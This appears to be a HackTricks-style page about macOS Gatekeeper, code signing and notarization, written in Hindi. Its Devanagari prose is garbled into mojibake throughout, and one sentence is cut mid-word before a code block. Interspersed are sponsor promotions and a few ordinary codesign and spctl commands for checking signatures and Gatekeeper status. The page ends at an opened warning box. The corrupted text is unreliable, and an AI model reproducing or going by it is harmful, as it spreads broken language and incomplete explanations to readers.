# macOS рдЧреЗрдЯрдХреАрдкрд░ / рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди / рдПрдХреНрд╕рдкреНрд░реЛрдЯреЗрдХреНрдЯ

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрди рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреЛ рдкреАрдбреАрдПрдл рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдПрдХреНрд╕реЗрд╕** рдЪрд╛рд╣рд┐рдП? [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* [**рджреА рдкреАрдПрд╕ рдлреИрдорд┐рд▓реА**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**рдПрдирдПрдлрдЯреАрдЬрд╝**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ рдкреАрдПрд╕ рдФрд░ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рдЧреНрд░реБрдк**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рдЧреНрд░реБрдк**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВ ЁЯРж[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд░реЗрдкреЛ** рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ **рдФрд░** [**рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕-рдХреНрд▓рд╛рдЙрдб рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** рджреЗрдЦреЗрдВ

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## рдЧреЗрдЯрдХреАрдкрд░

**рдЧреЗрдЯрдХреАрдкрд░** рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ рдЬреЛ рдореИрдХ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд▓рд┐рдП рд╡рд┐рдХрд╕рд┐рдд рдХреА рдЧрдИ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЙрдирдХреЗ рд╕рд┐рд╕реНрдЯрдо рдкрд░ **рдХреЗрд╡рд▓ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдЪрд▓рд╛рдПрдВ**ред рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдФрд░ рдЦреЛрд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ **рдЬреИрд╕реЗ рдХрд┐ рдПрдХ рдРрдк, рдПрдХ рдкреНрд▓рдЧ-рдЗрди, рдпрд╛ рдПрдХ рдЗрдВрд╕реНрдЯреЙрд▓рд░ рдкреИрдХреЗрдЬ** рд╕реЗ **рдмрд╛рд╣рд░реА рд╕реНрд░реЛрддреЛрдВ рд╕реЗ**ред

рдЧреЗрдЯрдХреАрдкрд░ рдХреА рдореБрдЦреНрдп рддрдВрддреНрд░рд┐рдХрд╛ рдЙрд╕рдХреА **рд╕рддреНрдпрд╛рдкрди** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╣реИред рдпрд╣ рдпрд╣ рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ **рдХрд┐рд╕реА рдорд╛рдиреНрдпрддрд╛ рдкреНрд░рд╛рдкреНрдд рдбреЗрд╡рд▓рдкрд░ рджреНрд╡рд╛рд░рд╛ рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**, рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреА рдкреНрд░рд╛рдорд╛рдгрд┐рдХрддрд╛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реБрдПред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ **рдПрдкреНрдкрд▓ рджреНрд╡рд╛рд░рд╛ рдиреЛрдЯрд░рд╛рдЗрдЬрд╝реНрдб** рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдпрд╣ рд╕рд╛рдмрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдЗрд╕рдореЗрдВ рдХрд┐рд╕реА рдЬрд╛рдиреЗ-рдорд╛рдиреЗ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рд╕рд╛рдордЧреНрд░реА рдХреА рдХрдореА рд╣реИ рдФрд░ рдиреЛрдЯрд░рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЗ рдмрд╛рдж рдЗрд╕рдореЗрдВ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдЧреЗрдЯрдХреАрдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд┐рдпрдВрддреНрд░рдг рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдордЬрдмреВрдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдП рдЧрдП рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреЛ рдкрд╣рд▓реА рдмрд╛рд░ рдЦреЛрд▓рдиреЗ рдХреА **рдордВрдЬреВрд░реА рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░реЛрддреНрд╕рд╛рд╣рд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдбреЗрдЯрд╛ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рдЧрд▓рддреА рд╕реЗ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдПрдХреНрдЭреАрдХреНрдпреВрдЯреЗрдмрд▓ рдХреЛ рдЪрд▓рд╛рдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддреА рд╣реИред

### рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╣рд╕реНрддрд╛рдХреНрд╖рд░

рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╣рд╕реНрддрд╛рдХреНрд╖рд░, рдЬрд┐рдиреНрд╣реЗрдВ рдХреЛрдб рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рднреА рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдПрдкреНрдкрд▓ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдмреБрдирд┐рдпрд╛рдж рдХрд╛ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдШрдЯрдХ рд╣реИред рдЗрдирдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рд▓реЗрдЦрдХ (рдбреЗрд╡рд▓рдкрд░) рдХреА рдкрд╣рдЪрд╛рди **рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ** рдФрд░ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рдХреЛрдб рдЙрд╕ рд╕рдордп рд╕реЗ рдЬрдм рдЖрдЦрд┐рд░реА рдмрд╛рд░ рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЙрд╕рдореЗрдВ рдХреЛрдИ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рдпрд╣ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ:

1. **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд╕рд╛рдЗрди рдХрд░рдирд╛:** рдЬрдм рдПрдХ рдбреЗрд╡рд▓рдкрд░ рдЕрдкрдиреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд╡рд┐рддрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рд╣реЛрддрд╛ рд╣реИ, рд╡рд╣ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдПрдХ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рд╛рдЗрди рдХрд░рддрд╛ рд╣реИ**ред рдпрд╣ рдирд┐рдЬреА рдХреБрдВрдЬреА рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИ рдЬрд┐рд╕реЗ рдбреЗрд╡рд▓рдкрд░ рдХреЛ рдЬрдм рд╡рд╣ рдПрдкреНрдкрд▓ рдбреЗрд╡рд▓рдкрд░ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдореЗрдВ рдирд╛рдорд╛рдВрдХрд┐рдд рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдПрдкреНрдкрд▓ рдЬрд╛рд░реА рдХрд░рддрд╛ рд╣реИред рд╕рд╛рдЗрдирд┐рдВрдЧ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕рднреА рд╣рд┐рд╕реНрд╕реЛрдВ рдХрд╛ рдПрдХ рдФрд░реНрдзреНрд╡рдЧрддрд┐ рд╣реИрд╢ рдмрдирд╛рдирд╛ рдФрд░ рдЗрд╕ рд╣реИрд╢ рдХреЛ рдбреЗрд╡рд▓рдкрд░ рдХреА рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред
2. **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд╡рд┐рддрд░рд┐рдд рдХрд░рдирд╛:** рд╕рд╛рдЗрди рдХрд┐рдП рдЧрдП рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдбреЗрд╡рд▓рдкрд░ рдХреЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рд╡рд┐рддрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рд╕рдВрдмрдВрдзрд┐рдд рдкрдмреНрд▓рд┐рдХ рдХреБрдВрдЬреА рд╣реЛрддреА рд╣реИред
3. **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рд╕рддреНрдпрд╛рдкрди:** рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЪрд▓рд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЙрдирдХрд╛ рдореИрдХ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдбреЗрд╡рд▓рдкрд░ рдХреЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╕реЗ рдкрдмреНрд▓рд┐рдХ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реИрд╢ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рддрд╛ рд╣реИред рдлрд┐рд░ рдпрд╣ рд╣реИрд╢ рдкреБрдирдГ рдЧрдгрдирд╛ рдХрд░рддрд╛ рд╣реИ рдЖрдзрд╛рд░рд┐рдд рд╣реИрд╢ рдХреЛ рдФрд░ рдЗрд╕реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдП рдЧрдП рд╣реИрд╢ рдХреЗ рд╕рд╛рде рддреБрд▓рдирд╛ рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рд╡реЗ рдорд┐рд▓рддреЗ рд╣реИрдВ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдХреЛрдИ рдкрд░рд┐рд╡рд░реНрддрди рдирд╣реАрдВ** рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬрдм рд╕реЗ рдбреЗрд╡рд▓рдкрд░ рдиреЗ рдЗрд╕реЗ рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдерд╛, рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдПрдкреНрдкрд▓ рдХреЗ рдЧреЗрдЯрдХреАрдкрд░ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдХрд╛ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣рд┐рд╕реНрд╕рд╛ рд╣реИред рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдП рдЧрдП рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЦреЛрд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ**, рддреЛ рдЧреЗрдЯрдХреАрдкрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рд╕рддреНрдпрд╛рдкрди рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рдпрд╣ рдПрдкреНрдкрд▓ рджреНрд╡рд╛рд░рд╛ рдПрдХ рдЬрд╛рдиреЗ-рдорд╛рдиреЗ рдбреЗрд╡рд▓рдкрд░ рдХреЛ рдЬрд╛рд░реА рдХрд┐рдП рдЧрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╕реЗ рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдХреЛрдб рдореЗрдВ рдХреЛрдИ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЧреЗрдЯрдХреАрдкрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЕрдиреНрдпрдерд╛, рдпрд╣ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЪреЗрддрд╛рд╡рдиреА рджреЗрддрд╛ рд╣реИред

рдореИрдХрдУрдПрд╕ рдХреИрдЯрд╛рд▓рд┐рдирд╛ рд╕реЗ рд╢реБрд░реВ рд╣реЛрдХрд░, **рдЧреЗрдЯрдХреАрдкрд░ рдпрд╣ рднреА рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдПрдкреНрдкрд▓ рджреНрд╡рд╛рд░рд╛ рдиреЛрдЯрд░рд╛рдЗрдЬрд╝реНрдб** рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬреЛ рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрддрд░ рдЬреЛрдбрд╝рддрд╛ рд╣реИред рдиреЛрдЯрд░рд╛рдЗрдЬрд╝реЗрд╢рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЬрд╛рдиреЗ-рдорд╛рдиреЗ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдорд╕реНрдпрд╛рдУрдВ рдФрд░ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдХреЛрдб рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪрддреА рд╣реИ, рдФрд░ рдпрджрд┐ рдпреЗ рдЬрд╛рдВрдЪреЗрдВ рдкрд╛рд╕ рд╣реЛрддреА рд╣реИрдВ, рддреЛ рдПрдкреНрдкрд▓ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдПрдХ рдЯрд┐рдХрдЯ рдЬреЛрдбрд╝рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЧреЗрдЯрдХреАрдкрд░ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

#### рд╣рд╕реНрддрд╛рдХреНрд╖рд░реЛрдВ рдХреА рдЬрд╛рдВрдЪ

рдХрд┐рд╕реА **рдо
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the appтАЩs contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### рд╕реНрд╡реАрдХреГрддрд┐

рдПрдкреНрдкрд▓ рдХреА рд╕реНрд╡реАрдХреГрддрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд╣рд╛рдирд┐рдХрд╛рд░рдХ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рд╛рд╡рдзрд╛рди рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддреА рд╣реИред рдЗрд╕рдореЗрдВ **рдбреЗрд╡рд▓рдкрд░ рдЕрдкрдиреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдПрдкреНрдкрд▓ рдХреА рдиреЛрдЯрд░реА рд╕реЗрд╡рд╛** рдХреЗ рджреНрд╡рд╛рд░рд╛ **рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рдкреНрд░рд╕реНрддреБрдд** рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдПрдкреНрдк рд░рд┐рд╡реНрдпреВ рд╕реЗ рднрд┐рдиреНрди рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрд╣ рд╕реЗрд╡рд╛ рдПрдХ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдкреНрд░рдгрд╛рд▓реА** рд╣реИ рдЬреЛ рдкреНрд░рд╕реНрддреБрдд рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреЛ **рд╣рд╛рдирд┐рдХрд╛рд░рдХ рд╕рд╛рдордЧреНрд░реА** рдФрд░ рдХреЛрдб-рд╕рд╛рдЗрдирд┐рдВрдЧ рдХреЗ рд╕рд╛рде рдХрд┐рд╕реА рднреА рд╕рдВрднрд╛рд╡рд┐рдд рд╕рдорд╕реНрдпрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪрддреА рд╣реИред

рдпрджрд┐ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ **рдЗрд╕ рдЬрд╛рдВрдЪ рдореЗрдВ рд╕рдлрд▓рддрд╛ рдкреНрд░рд╛рдкреНрдд** рдХрд░рддрд╛ рд╣реИ рдФрд░ рдХреЛрдИ рднреА рдЪрд┐рдВрддрд╛ рдирд╣реАрдВ рдЙрдард╛рддрд╛ рд╣реИ, рддреЛ рдиреЛрдЯрд░реА рд╕реЗрд╡рд╛ рдПрдХ рд╕реНрд╡реАрдХреГрддрд┐ рдЯрд┐рдХрдЯ рдЙрддреНрдкрдиреНрди рдХрд░рддреА рд╣реИред рдЙрд╕рдХреЗ рдмрд╛рдж рдбреЗрд╡рд▓рдкрд░ рдХреЛ рдЕрдкрдиреЗ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреЗ рд╕рд╛рде рдЗрд╕ рдЯрд┐рдХрдЯ рдХреЛ **рдЬреЛрдбрд╝рдирд╛ рдЕрдирд┐рд╡рд╛рд░реНрдп рд╣реЛрддрд╛ рд╣реИ**, рдЬрд┐рд╕реЗ 'рд╕реНрдЯреИрдкреНрд▓рд┐рдВрдЧ' рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рд╕реНрд╡реАрдХреГрддрд┐ рдЯрд┐рдХрдЯ рдХреЛ рднреА рдСрдирд▓рд╛рдЗрди рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рдЧреЗрдЯрдХреАрдкрд░, рдПрдкреНрдкрд▓ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА, рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддреА рд╣реИред

рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╣рд▓реЗ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреЗ рд╕реНрдерд╛рдкрдирд╛ рдпрд╛ рдЙрд╕рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдкрд░, рдиреЛрдЯрд░реАрдХрд░рдг рдЯрд┐рдХрдЯ рдХреА рдореМрдЬреВрджрдЧреА - рдЪрд╛рд╣реЗ рд╡рд╣ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдХреЗ рд╕рд╛рде рд╕реНрдЯреИрдкрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ рдпрд╛ рдСрдирд▓рд╛рдЗрди рдкрд╛рдпрд╛ рдЬрд╛рдП - рдЧреЗрдЯрдХреАрдкрд░ рдХреЛ рд╕реВрдЪрд┐рдд рдХрд░рддреА рд╣реИ рдХрд┐ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреЛ рдПрдкреНрдкрд▓ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡реАрдХреГрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЗрд╕ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдЧреЗрдЯрдХреАрдкрд░ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рд▓реЙрдиреНрдЪ рд╕рдВрд╡рд╛рдж рдореЗрдВ рдПрдХ рд╡рд┐рд╡рд░рдгрд╛рддреНрдордХ рд╕рдВрджреЗрд╢ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЙрдирдХреЗ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд╕реНрдерд╛рдкрд┐рдд рдпрд╛ рдЪрд▓рд╛рдП рдЧрдП рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХреА рдЬрд╛рдВрдЪ рдХреА рдЧрдИ рд╣реИред

### рдЧреЗрдЯрдХреАрдкрд░ рдХреА рдЧрдгрдирд╛

рдЧреЗрдЯрдХреАрдкрд░ рдПрдХ рд╣реИ, **рдХрдИ рд╕реБрд░рдХреНрд╖рд╛ рдШрдЯрдХ** рдЬреЛ рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдРрдкреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рд╕реЗ рд░реЛрдХрддреЗ рд╣реИрдВ рдФрд░ рдПрдХ рд╣реИ, **рдЙрдирдореЗрдВ рд╕реЗ рдПрдХ рдШрдЯрдХ**ред

рдЧреЗрдЯрдХреАрдкрд░ рдХреА **рд╕реНрдерд┐рддрд┐** рджреЗрдЦрдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```bash
# Check the status
spctl --status
```
{% hint style="danger" %}
